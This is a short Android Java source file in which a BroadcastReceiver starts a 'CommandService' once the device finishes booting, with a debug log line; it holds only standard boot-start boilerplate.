package com.mobilemorph.agent.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.mobilemorph.agent.services.CommandService;

public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d("BootReceiver", "Boot detected, starting CommandService...");
            Intent serviceIntent = new Intent(context, CommandService.class);
            context.startService(serviceIntent);
        }
    }
}
